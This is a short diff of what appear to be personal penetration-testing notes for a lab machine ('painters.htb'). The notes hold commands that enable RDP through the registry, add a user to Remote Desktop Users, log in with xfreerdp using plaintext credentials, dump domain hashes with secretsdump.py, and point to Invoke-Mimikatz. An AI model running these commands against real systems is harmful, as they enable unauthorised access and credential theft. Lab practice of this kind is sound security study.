@@ -1,3 +1,5 @@
+# RDP
+
 #### 1. 启用 RDP 服务
 Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0
 
@@ -20,8 +22,11 @@ Add-LocalGroupMember -Group "Remote Desktop Users" -Member "riley"
 
 xfreerdp /u:riley /p:P@ssw0rd /d:painters.htb /v:192.168.110.56 /cert:ignore
 
+----
 
+# Hash Dump
 
 secretsdump.py painters.htb/web_svc:'!QAZ1qaz'@192.168.110.52
 
+`/usr/share/windows-resources/powersploit/Exfiltration/Invoke-Mimikatz.ps1`
 
